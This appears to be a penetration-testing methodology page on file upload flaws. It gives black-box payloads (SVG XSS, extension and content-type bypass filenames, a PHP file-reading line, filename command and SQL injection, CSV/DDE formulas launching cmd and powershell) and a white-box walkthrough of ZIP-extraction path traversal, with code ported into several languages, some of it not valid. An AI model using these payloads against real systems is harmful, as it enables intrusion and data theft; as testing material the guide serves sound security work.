# Upload of Unexpected File Types

## Check List

## Methodology

### Black Box

#### [Stored Cross-Site Scripting (Stored XSS) via SVG Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/Files/SVG_XSS1.svg)

{% stepper %}
{% step %}
Login to Account
{% endstep %}

{% step %}
Access your account with valid credentials
{% endstep %}

{% step %}
Open Your Project
{% endstep %}

{% step %}
Navigate to the specific project you want to test
{% endstep %}

{% step %}
Go to the locate the avatar upload form
{% endstep %}

{% step %}
Attach PNG File with SVG Code and Upload a PNG file containing the SVG code

```xml
<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg onload="alert(1)" xmlns="http://www.w3.org/2000/svg"> <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/> </svg>
```
{% endstep %}

{% step %}
Click forward the request and after creating the image, open it and Check if an alert dialog appears; if not, click the triangle again to confirm
{% endstep %}
{% endstepper %}

***

#### [File Extension Filter Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files#upload-tricks)

{% stepper %}
{% step %}
Check what are file extensions allowed in the web app. This depends on the type of backend server

`.php` ,`.html`, `.jsp`, `.svg`, `.asp`, `.aspx` ,`pHp`, `pHP5`, `PhAr`, `hTmL`, `etc` ,`.pht` ,`.phps` ,`.phar` ,`.phpt` ,`.pgif` ,`.phtml` ,`.phtm` ,`.inc`
{% endstep %}

{% step %}
#### Double-Extension Upload Bypass

Try adding a valid extension before the execution extension `exploit.png.php or exploit.php.png`&#x20;
{% endstep %}

{% step %}
#### Trailing-Extension Upload Bypass

Check adding a valid extension at the end `exploit.php/.jpg` ( app may save this as a .php file but recognizes as `.jpg`)
{% endstep %}

{% step %}
#### Encoding Bypass

Try encoding `exploit.php%0d%0a.jpg or exploit.jpg%0d%0a.php`
{% endstep %}

{% step %}
#### Null Byte Injection Bypass

Upload a file with a null byte injection `exploit.php%00.jpg or exploit.jpg%00.php`
{% endstep %}

{% step %}
#### Semicolon Extension bypass

Add semicolons before the file extension `exploit.asp;.jpg`
{% endstep %}

{% step %}
#### Multibyte Unicode Filename Normalization Bypass

Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization Sequences like xC0 x2E, xC4 xAE or xC0 xAE may be translated to x2E if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path
{% endstep %}

{% step %}
#### Overlapping-Extension Bypass

Try positioning the prohibited string in such a way that removing it still leaves behind a valid file extension. For example, consider what happens if you strip .php from the following filename\
`exploit.p.phphp`
{% endstep %}

{% step %}
#### Filename-Based XSS

Try to put the XSS payload in the name of the `filetest.jpg`,`test.jpg`
{% endstep %}

{% step %}
#### Filename-Based Command Injection

Command Injection in the `filename e.g. ; sleep 10;`
{% endstep %}

{% step %}
#### Content-Type Spoofing

Try to use extension as .html and change Content-Type to `html/text`

```http
------WebKitFormBoundary6IrxqgTfmnW0FkOZ
Content-Disposition: form-data; name="uploadimage"; 
filename="exploit.html"
Content-Type: html/text
```
{% endstep %}

{% step %}
#### Missing Content-Type Upload Bypass

Try to send the request with no Content-Type

```http
------WebKitFormBoundary6IrxqgTfmnW0FkOZ
Content-Disposition: form-data; name="uploadimage"; 
filename="exploit.html"


<code here>
```
{% endstep %}

{% step %}
#### Content-Type Spoofing

Try to use extension as `.jpg/png` ( if app expects image only) but change Content-Type to `text/html`

```http
------WebKitFormBoundary6IrxqgTfmnW0FkOZ
Content-Disposition: form-data; name="uploadimage"; 
filename="exploit.jpg"
Content-Type: text/html
```
{% endstep %}

{% step %}
#### Extensionless Upload + Content-Type Spoofing

Try leaving extension blank and Content-Type `text/html`

```http
------WebKitFormBoundary6IrxqgTfmnW0FkOZ
Content-Disposition: form-data; name="uploadimage"; 
filename="file."
Content-Type: text/html
```
{% endstep %}

{% step %}
#### Extension-Only Upload + Content-Type Spoofing

Try using the extension only&#x20;

```http
------WebKitFormBoundary6IrxqgTfmnW0FkOZ
Content-Disposition: form-data; name="uploadimage"; 
filename=".html"
Content-Type: image/png
```
{% endstep %}

{% step %}
#### Filename Special-Characters Bypass

Try to use especial characters in the names

```http
------WebKitFormBoundary6IrxqgTfmnW0FkOZ
Content-Disposition: form-data; name="uploadimage";
filename="exploit.jpg#/?&=+.html"
Content-Type: image/jpeg
```
{% endstep %}

{% step %}
#### File Upload Manipulation

Try changing Content-Type\
When uploading, Content Type could be: Content-Type: `application/octet-stream` or Content-Type: `application/x-php` try replacing it with`image/jpeg/`,`image/jpg`, `image.png`, `image/gif`

```http
------WebKitFormBoundary6IrxqgTfmnW0FkOZ
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/octet-stream

<?php echo file_get_contents('/home/carlos/secret'); ?>
```
{% endstep %}

{% step %}
#### Unicode Bypass

Try to use Unicode

```http
Content-Disposition: form-data; name="uploadimage"; 
filename="exploit.jpg%u0025%u0030%u0039.php"
Content-Type: application/php

<?php echo file_get_contents('/home/carlos/secret'); ?>
```
{% endstep %}

{% step %}
#### Time-Based SQLi Payloads

```
poc.js'(select*from(select(sleep(20)))a)+'.extension
```
{% endstep %}
{% endstepper %}

***

#### CSV Injection

{% stepper %}
{% step %}
Register an account and explore all features that allow sending data that will later be `visible/exported` by an admin or another user
{% endstep %}

{% step %}
Look specifically for contact forms, feedback forms, support tickets, guestbook, comments, or any `“send message to admin”` functionality
{% endstep %}

{% step %}
Submit a normal message and confirm that the admin can view and export these messages as `CSV/Exce`l
{% endstep %}

{% step %}
Craft and send the following classic CSV injection payloads in any text field that will appear in the exported file (name, message, email, subject, etc.)

```csv
=DDE("cmd";"/C calc";"!A0")A0
=2+5
=cmd|'/C calc'!A0
=cmd|'/C powershell'!A0
=4+4
=1+1+1+1+1
@SUM(1+1)*cmd|'/C calc'!A0
```
{% endstep %}

{% step %}
Wait or ask the admin in real scenario the victim opens the file to `export/download` the messages as CSV
{% endstep %}

{% step %}
When the exported CSV file is opened in Microsoft Excel, LibreOffice Calc, Google Sheets (when imported or any spreadsheet software
{% endstep %}
{% endstepper %}

***

### White Box

#### Arbitrary File Upload via Archive Filename Canonicalization Confusion Leading to Path Traversal

{% stepper %}
{% step %}
Map the entire target system or product using the Burp Suite tool
{% endstep %}

{% step %}
Draw the entry points and endpoints in XMind
{% endstep %}

{% step %}
Decompile the application based on the programming language used
{% endstep %}

{% step %}
In the service, look for endpoints named import, Restore, or Upload
{% endstep %}

{% step %}
Find the processing logic of these endpoints in the code and check under what conditions the code reaches the file processing stage

{% tabs %}
{% tab title="C#" %}
```csharp
protected override void OnLoad(EventArgs e)
{
	base.OnLoad(e);
	if (base.IsEvent)
	{
		return;
	}
	if (base.Request.Files.Count <= 0)
	{
		return;
	}
	UrlHandle urlHandle;
	if (!UrlHandle.TryGetHandle(out urlHandle) || urlHandle == null) // [1]
	{
		SecurityException ex = new SecurityException("Upload handle invalid");
		Log.Error("File upload handle not found. Path: " + base.Request.Form["Path"], ex, this);
		throw ex;
	}
	string folder = urlHandle["Path"]; // [2]
	string text = urlHandle["Item"];
	string name = urlHandle["Language"];
	bool overwrite = urlHandle["Overwrite"] == "1";
	bool unpack = urlHandle["Unzip"] == "1";
	bool versioned = urlHandle["Versioned"] == "1";
	string allowedFileTypes = urlHandle["AllowedFileTypes"];
	UrlHandle.DisposeHandle(urlHandle);
	UploadArgs uploadArgs = new UploadArgs // [3]
	{
		Files = base.Request.Files,
		Overwrite = overwrite,
		Unpack = unpack,
		Versioned = versioned,
		Language = Language.Parse(name),
		AllowedFileTypes = allowedFileTypes
	};
	if (!string.IsNullOrEmpty(text)) // [4]
	{
		uploadArgs.Folder = text;
		uploadArgs.Destination = UploadDestination.Database;
	}
	else
	{
		uploadArgs.Folder = folder;
		uploadArgs.Destination = UploadDestination.File;
		uploadArgs.FileOnly = true; // [5]
	}
	Pipeline pipeline = PipelineFactory.GetPipeline("uiUpload"); // [6]
	pipeline.Start(uploadArgs);
}
```
{% endtab %}

{% tab title="Java" %}
```java
protected void OnLoad(EventArgs e)
{
	super.OnLoad(e);
	if (super.IsEvent)
	{
		return;
	}
	if (super.Request.Files.Count <= 0)
	{
		return;
	}
	UrlHandle urlHandle;
	if (!UrlHandle.TryGetHandle(urlHandle) || urlHandle == null) // [1]
	{
		SecurityException ex = new SecurityException("Upload handle invalid");
		Log.Error("File upload handle not found. Path: " + super.Request.Form["Path"], ex, this);
		throw ex;
	}
	String folder = urlHandle.get("Path"); // [2]
	String text = urlHandle.get("Item");
	String name = urlHandle.get("Language");
	boolean overwrite = urlHandle.get("Overwrite").equals("1");
	boolean unpack = urlHandle.get("Unzip").equals("1");
	boolean versioned = urlHandle.get("Versioned").equals("1");
	String allowedFileTypes = urlHandle.get("AllowedFileTypes");
	UrlHandle.DisposeHandle(urlHandle);
	UploadArgs uploadArgs = new UploadArgs(); // [3]
	uploadArgs.Files = super.Request.Files;
	uploadArgs.Overwrite = overwrite;
	uploadArgs.Unpack = unpack;
	uploadArgs.Versioned = versioned;
	uploadArgs.Language = Language.Parse(name);
	uploadArgs.AllowedFileTypes = allowedFileTypes;
	if (!(text == null || text.isEmpty())) // [4]
	{
		uploadArgs.Folder = text;
		uploadArgs.Destination = UploadDestination.Database;
	}
	else
	{
		uploadArgs.Folder = folder;
		uploadArgs.Destination = UploadDestination.File;
		uploadArgs.FileOnly = true; // [5]
	}
	Pipeline pipeline = PipelineFactory.GetPipeline("uiUpload"); // [6]
	pipeline.Start(uploadArgs);
}
```
{% endtab %}

{% tab title="PHP" %}
```php
protected function OnLoad($e)
{
	parent::OnLoad($e);
	if (parent::$IsEvent)
	{
		return;
	}
	if (parent::$Request->Files->Count <= 0)
	{
		return;
	}
	$urlHandle = null;
	if (!UrlHandle::TryGetHandle($urlHandle) || $urlHandle == null) // [1]
	{
		$ex = new SecurityException("Upload handle invalid");
		Log::Error("File upload handle not found. Path: " . parent::$Request->Form["Path"], $ex, $this);
		throw $ex;
	}
	$folder = $urlHandle["Path"]; // [2]
	$text = $urlHandle["Item"];
	$name = $urlHandle["Language"];
	$overwrite = $urlHandle["Overwrite"] == "1";
	$unpack = $urlHandle["Unzip"] == "1";
	$versioned = $urlHandle["Versioned"] == "1";
	$allowedFileTypes = $urlHandle["AllowedFileTypes"];
	UrlHandle::DisposeHandle($urlHandle);
	$uploadArgs = new UploadArgs(); // [3]
	$uploadArgs->Files = parent::$Request->Files;
	$uploadArgs->Overwrite = $overwrite;
	$uploadArgs->Unpack = $unpack;
	$uploadArgs->Versioned = $versioned;
	$uploadArgs->Language = Language::Parse($name);
	$uploadArgs->AllowedFileTypes = $allowedFileTypes;
	if (!empty($text)) // [4]
	{
		$uploadArgs->Folder = $text;
		$uploadArgs->Destination = UploadDestination::Database;
	}
	else
	{
		$uploadArgs->Folder = $folder;
		$uploadArgs->Destination = UploadDestination::File;
		$uploadArgs->FileOnly = true; // [5]
	}
	$pipeline = PipelineFactory::GetPipeline("uiUpload"); // [6]
	$pipeline->Start($uploadArgs);
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
function OnLoad(e)
{
	super.OnLoad(e);
	if (super.IsEvent)
	{
		return;
	}
	if (super.Request.Files.Count <= 0)
	{
		return;
	}
	let urlHandle;
	if (!UrlHandle.TryGetHandle(urlHandle) || urlHandle == null) // [1]
	{
		let ex = new SecurityException("Upload handle invalid");
		Log.Error("File upload handle not found. Path: " + super.Request.Form["Path"], ex, this);
		throw ex;
	}
	let folder = urlHandle["Path"]; // [2]
	let text = urlHandle["Item"];
	let name = urlHandle["Language"];
	let overwrite = urlHandle["Overwrite"] == "1";
	let unpack = urlHandle["Unzip"] == "1";
	let versioned = urlHandle["Versioned"] == "1";
	let allowedFileTypes = urlHandle["AllowedFileTypes"];
	UrlHandle.DisposeHandle(urlHandle);
	let uploadArgs = new UploadArgs(); // [3]
	uploadArgs.Files = super.Request.Files;
	uploadArgs.Overwrite = overwrite;
	uploadArgs.Unpack = unpack;
	uploadArgs.Versioned = versioned;
	uploadArgs.Language = Language.Parse(name);
	uploadArgs.AllowedFileTypes = allowedFileTypes;
	if (!(text == null || text === "")) // [4]
	{
		uploadArgs.Folder = text;
		uploadArgs.Destination = UploadDestination.Database;
	}
	else
	{
		uploadArgs.Folder = folder;
		uploadArgs.Destination = UploadDestination.File;
		uploadArgs.FileOnly = true; // [5]
	}
	let pipeline = PipelineFactory.GetPipeline("uiUpload"); // [6]
	pipeline.Start(uploadArgs);
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
If the processing flow reaches a pipeline, map and analyze the pipeline flow, and trace the data flow until the method that finally saves the uploaded file to the system (`Note:` Pipelines are usually defined in configuration files and contain step-by-step processing methods)

```xml
<uiUpload>
  <processor mode="on" type="Sitecore.Pipelines.Upload.CheckPermissions, Sitecore.Kernel" />
  <processor mode="on" type="Sitecore.Pipelines.Upload.ValidateContentType, Sitecore.Kernel" />
  <processor mode="on" type="Sitecore.Pipelines.Upload.CheckSize, Sitecore.Kernel" />
  <processor mode="on" type="Sitecore.Pipelines.Upload.CheckSvgForJs, Sitecore.Kernel" resolve="true" />
  <processor mode="on" type="Sitecore.Pipelines.Upload.ResolveFolder, Sitecore.Kernel" />
  <processor mode="on" type="Sitecore.Pipelines.Upload.Save, Sitecore.Kernel" />
  <processor mode="on" type="Sitecore.Pipelines.Upload.Done, Sitecore.Kernel" />
</uiUpload>
```
{% endstep %}

{% step %}
After reaching the final file-saving method, check whether there is a separate upload path that directly processes ZIP or TAR files. If yes, focus on the archive handling functionality

{% tabs %}
{% tab title="C#" %}
```csharp
public void Process(UploadArgs args)
{
	Assert.ArgumentNotNull(args, "args");
	for (int i = 0; i < args.Files.Count; i++)
	{
		HttpPostedFile httpPostedFile = args.Files[i];
		if (!string.IsNullOrEmpty(httpPostedFile.FileName))
		{
			try
			{
				bool flag = UploadProcessor.IsUnpack(args, httpPostedFile);
				if (args.FileOnly)
				{
					if (flag)
					{
						Save.UnpackToFile(args, httpPostedFile); // [1]
					}
					else
					{
						string filename = this.UploadToFile(args, httpPostedFile); // [2]
						if (i == 0)
						{
							args.Properties["filename"] = FileHandle.GetFileHandle(filename);
						}
					}
				}
			}
		}
	}
}
```
{% endtab %}

{% tab title="Java" %}
```java
public void Process(UploadArgs args)
{
	Assert.ArgumentNotNull(args, "args");
	for (int i = 0; i < args.Files.Count; i++)
	{
		HttpPostedFile httpPostedFile = args.Files[i];
		if (!(httpPostedFile.FileName == null || httpPostedFile.FileName.isEmpty()))
		{
			try
			{
				boolean flag = UploadProcessor.IsUnpack(args, httpPostedFile);
				if (args.FileOnly)
				{
					if (flag)
					{
						Save.UnpackToFile(args, httpPostedFile); // [1]
					}
					else
					{
						String filename = this.UploadToFile(args, httpPostedFile); // [2]
						if (i == 0)
						{
							args.Properties.put("filename", FileHandle.GetFileHandle(filename));
						}
					}
				}
			}
			catch (Exception ex)
			{
			}
		}
	}
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public function Process($args)
{
	Assert::ArgumentNotNull($args, "args");
	for ($i = 0; $i < $args->Files->Count; $i++)
	{
		$httpPostedFile = $args->Files[$i];
		if (!empty($httpPostedFile->FileName))
		{
			try
			{
				$flag = UploadProcessor::IsUnpack($args, $httpPostedFile);
				if ($args->FileOnly)
				{
					if ($flag)
					{
						Save::UnpackToFile($args, $httpPostedFile); // [1]
					}
					else
					{
						$filename = $this->UploadToFile($args, $httpPostedFile); // [2]
						if ($i == 0)
						{
							$args->Properties["filename"] = FileHandle::GetFileHandle($filename);
						}
					}
				}
			}
			catch (Exception $ex)
			{
			}
		}
	}
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
function Process(args)
{
	Assert.ArgumentNotNull(args, "args");
	for (let i = 0; i < args.Files.Count; i++)
	{
		let httpPostedFile = args.Files[i];
		if (!(httpPostedFile.FileName == null || httpPostedFile.FileName === ""))
		{
			try
			{
				let flag = UploadProcessor.IsUnpack(args, httpPostedFile);
				if (args.FileOnly)
				{
					if (flag)
					{
						Save.UnpackToFile(args, httpPostedFile); // [1]
					}
					else
					{
						let filename = this.UploadToFile(args, httpPostedFile); // [2]
						if (i == 0)
						{
							args.Properties["filename"] = FileHandle.GetFileHandle(filename);
						}
					}
				}
			}
			catch (ex)
			{
			}
		}
	}
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Analyze the flow of the method that processes the ZIP file

**VSCode (Regex Detection)**

{% tabs %}
{% tab title="C#" %}
```regexp
(ZipArchive\s*\()|(ZipArchiveEntry)|(GetUniqueFilename)|(MapPath)|(SaveAs\s*\()|(SaveUnpackedFiles)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(ZipInputStream)|(getNextEntry)|(FileOutputStream)|(Files\.write)|(unzip)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(ZipArchive)|(extractTo)|(fopen)|(move_uploaded_file)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(adm-zip)|(unzipper)|(extractAllTo)|(fs\.writeFile)
```
{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection(Linux))**

{% tabs %}
{% tab title="C#" %}
```regexp
ZipArchive\s*\(|ZipArchiveEntry|GetUniqueFilename|MapPath|SaveAs\s*\(|SaveUnpackedFiles
```
{% endtab %}

{% tab title="Java" %}
```regexp
ZipInputStream|getNextEntry|FileOutputStream|Files\.write|unzip
```
{% endtab %}

{% tab title="PHP" %}
```regexp
ZipArchive|extractTo|fopen|move_uploaded_file
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
adm-zip|unzipper|extractAllTo|fs\.writeFile
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Patterns**

{% tabs %}
{% tab title="C#" %}
```csharp
private static void UnpackToFile(UploadArgs args, HttpPostedFile file)
{
	string filename = FileUtil.MapPath(TempFolder.GetFilename("temp.zip"));
	file.SaveAs(filename);

	using (ZipArchive zipArchive = new ZipArchive(file.InputStream)) // [1]
	{
		string invalidEntryName;
		if (!Save.VerifyArchiveFilesName(args, zipArchive.Entries, file.FileName, out invalidEntryName)) // [2]
		{
			Save.AbortPipeline(args, file.FileName, invalidEntryName);
		}
		else
		{
			Save.SaveUnpackedFiles(args, zipArchive.Entries); // [3]
		}
	}
}
```
{% endtab %}

{% tab title="Java" %}
```java
private static void UnpackToFile(UploadArgs args, HttpPostedFile file)
{
	String filename = FileUtil.MapPath(TempFolder.GetFilename("temp.zip"));
	file.SaveAs(filename);

	try (ZipArchive zipArchive = new ZipArchive(file.InputStream)) // [1]
	{
		String invalidEntryName;
		if (!Save.VerifyArchiveFilesName(args, zipArchive.Entries, file.FileName, invalidEntryName)) // [2]
		{
			Save.AbortPipeline(args, file.FileName, invalidEntryName);
		}
		else
		{
			Save.SaveUnpackedFiles(args, zipArchive.Entries); // [3]
		}
	}
}
```
{% endtab %}

{% tab title="PHP" %}
```php
private static function UnpackToFile($args, $file)
{
	$filename = FileUtil::MapPath(TempFolder::GetFilename("temp.zip"));
	$file->SaveAs($filename);

	$zipArchive = new ZipArchive($file->InputStream); // [1]
	try
	{
		$invalidEntryName = null;
		if (!Save::VerifyArchiveFilesName($args, $zipArchive->Entries, $file->FileName, $invalidEntryName)) // [2]
		{
			Save::AbortPipeline($args, $file->FileName, $invalidEntryName);
		}
		else
		{
			Save::SaveUnpackedFiles($args, $zipArchive->Entries); // [3]
		}
	}
	finally
	{
		$zipArchive = null;
	}
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
function UnpackToFile(args, file)
{
	let filename = FileUtil.MapPath(TempFolder.GetFilename("temp.zip"));
	file.SaveAs(filename);

	using (let zipArchive = new ZipArchive(file.InputStream)) // [1]
	{
		let invalidEntryName;
		if (!Save.VerifyArchiveFilesName(args, zipArchive.Entries, file.FileName, invalidEntryName)) // [2]
		{
			Save.AbortPipeline(args, file.FileName, invalidEntryName);
		}
		else
		{
			Save.SaveUnpackedFiles(args, zipArchive.Entries); // [3]
		}
	}
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Identify the method that finalizes the filename before saving (Normalize / Sanitize / Unique Name Generator)

{% tabs %}
{% tab title="C#" %}
```csharp
private static void SaveUnpackedFiles(UploadArgs args, IReadOnlyCollection<ZipArchiveEntry> archiveEntries)
{
	foreach (ZipArchiveEntry zipArchiveEntry in archiveEntries)
	{
		string text = FileUtil.MakePath(args.Folder, zipArchiveEntry.FullName, '\\'); // [1]

		if (!args.Overwrite)
		{
			text = FileUtil.GetUniqueFilename(text); // [2]
		}

		FileUtil.CreateFile(text, zipArchiveEntry.Open(), true); // [3]
	}
}
```
{% endtab %}

{% tab title="Java" %}
```java
private static void SaveUnpackedFiles(UploadArgs args, IReadOnlyCollection<ZipArchiveEntry> archiveEntries)
{
	for (ZipArchiveEntry zipArchiveEntry : archiveEntries)
	{
		String text = FileUtil.MakePath(args.Folder, zipArchiveEntry.FullName, '\\'); // [1]

		if (!args.Overwrite)
		{
			text = FileUtil.GetUniqueFilename(text); // [2]
		}

		FileUtil.CreateFile(text, zipArchiveEntry.Open(), true); // [3]
	}
}
```
{% endtab %}

{% tab title="PHP" %}
```php
private static function SaveUnpackedFiles($args, $archiveEntries)
{
	foreach ($archiveEntries as $zipArchiveEntry)
	{
		$text = FileUtil::MakePath($args->Folder, $zipArchiveEntry->FullName, '\\'); // [1]

		if (!$args->Overwrite)
		{
			$text = FileUtil::GetUniqueFilename($text); // [2]
		}

		FileUtil::CreateFile($text, $zipArchiveEntry->Open(), true); // [3]
	}
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
function SaveUnpackedFiles(args, archiveEntries)
{
	for (let zipArchiveEntry of archiveEntries)
	{
		let text = FileUtil.MakePath(args.Folder, zipArchiveEntry.FullName, '\\'); // [1]

		if (!args.Overwrite)
		{
			text = FileUtil.GetUniqueFilename(text); // [2]
		}

		FileUtil.CreateFile(text, zipArchiveEntry.Open(), true); // [3]
	}
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Check whether any logical decision (if / flag / branch) is made based on the raw input before normalization. If a logical decision is based on raw input, check whether a special character (such as `\`, `/`, `:`, or `.`) can change the execution path. Also verify whether that character is later removed or replaced during sanitization while its logical effect still remains

{% tabs %}
{% tab title="C#" %}
```csharp
public static string GetUniqueFilename(string filePath)
{
	bool flag = filePath.IndexOf('\\') >= 0; // [1]
	string validFilePath = FileUtil.GetValidFilePath(filePath); // [2]
	string text = FileUtil.MapPath(validFilePath); // [3]

	string directoryName = Path.GetDirectoryName(text);
	string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(text);
	string extension = Path.GetExtension(text);

	int num = 1;
	string text2 = fileNameWithoutExtension;

	while (FileUtil.FileExists(text))
	{
		text2 = fileNameWithoutExtension + "_" + num.ToString("000");
		text = directoryName + "\\" + text2 + extension;
		num++;
	}

	if (flag)
	{
		return text; // [4]
	}

	int num2 = validFilePath.LastIndexOf('/'); // [5]
	if (num2 < 0)
	{
		return text2 + extension;
	}
	return validFilePath.Substring(0, num2 + 1) + text2 + extension;
}
```
{% endtab %}

{% tab title="Java" %}
```java
public static String GetUniqueFilename(String filePath)
{
	boolean flag = filePath.indexOf('\\') >= 0; // [1]
	String validFilePath = FileUtil.GetValidFilePath(filePath); // [2]
	String text = FileUtil.MapPath(validFilePath); // [3]

	String directoryName = Path.GetDirectoryName(text);
	String fileNameWithoutExtension = Path.GetFileNameWithoutExtension(text);
	String extension = Path.GetExtension(text);

	int num = 1;
	String text2 = fileNameWithoutExtension;

	while (FileUtil.FileExists(text))
	{
		text2 = fileNameWithoutExtension + "_" + String.format("%03d", num);
		text = directoryName + "\\" + text2 + extension;
		num++;
	}

	if (flag)
	{
		return text; // [4]
	}

	int num2 = validFilePath.lastIndexOf('/'); // [5]
	if (num2 < 0)
	{
		return text2 + extension;
	}
	return validFilePath.substring(0, num2 + 1) + text2 + extension;
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public static function GetUniqueFilename($filePath)
{
	$flag = strpos($filePath, '\\') !== false; // [1]
	$validFilePath = FileUtil::GetValidFilePath($filePath); // [2]
	$text = FileUtil::MapPath($validFilePath); // [3]

	$directoryName = Path::GetDirectoryName($text);
	$fileNameWithoutExtension = Path::GetFileNameWithoutExtension($text);
	$extension = Path::GetExtension($text);

	$num = 1;
	$text2 = $fileNameWithoutExtension;

	while (FileUtil::FileExists($text))
	{
		$text2 = $fileNameWithoutExtension . "_" . str_pad($num, 3, "0", STR_PAD_LEFT);
		$text = $directoryName . "\\" . $text2 . $extension;
		$num++;
	}

	if ($flag)
	{
		return $text; // [4]
	}

	$num2 = strrpos($validFilePath, '/'); // [5]
	if ($num2 === false)
	{
		return $text2 . $extension;
	}
	return substr($validFilePath, 0, $num2 + 1) . $text2 . $extension;
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
function GetUniqueFilename(filePath)
{
	let flag = filePath.indexOf('\\') >= 0; // [1]
	let validFilePath = FileUtil.GetValidFilePath(filePath); // [2]
	let text = FileUtil.MapPath(validFilePath); // [3]

	let directoryName = Path.GetDirectoryName(text);
	let fileNameWithoutExtension = Path.GetFileNameWithoutExtension(text);
	let extension = Path.GetExtension(text);

	let num = 1;
	let text2 = fileNameWithoutExtension;

	while (FileUtil.FileExists(text))
	{
		text2 = fileNameWithoutExtension + "_" + num.toString().padStart(3, '0');
		text = directoryName + "\\" + text2 + extension;
		num++;
	}

	if (flag)
	{
		return text; // [4]
	}

	let num2 = validFilePath.lastIndexOf('/'); // [5]
	if (num2 < 0)
	{
		return text2 + extension;
	}
	return validFilePath.substring(0, num2 + 1) + text2 + extension;
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Finally, find the function that converts a relative path into a physical path, and check whether it automatically prepends the Application Root or Webroot

{% tabs %}
{% tab title="C#" %}
```csharp
public static string MapPath(HttpContextBase context, string path)
{
	HttpServerUtilityBase server = WebUtil.GetServer(context); // [1]
	if (server != null)
	{
		return server.MapPath(path); // [2]
	}
}
```
{% endtab %}

{% tab title="Java" %}
```java
public static String MapPath(HttpContextBase context, String path)
{
	HttpServerUtilityBase server = WebUtil.GetServer(context); // [1]
	if (server != null)
	{
		return server.MapPath(path); // [2]
	}
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public static function MapPath($context, $path)
{
	$server = WebUtil::GetServer($context); // [1]
	if ($server != null)
	{
		return $server->MapPath($path); // [2]
	}
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
function MapPath(context, path)
{
	let server = WebUtil.GetServer(context); // [1]
	if (server != null)
	{
		return server.MapPath(path); // [2]
	}
}
```
{% endtab %}
{% endtabs %}
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
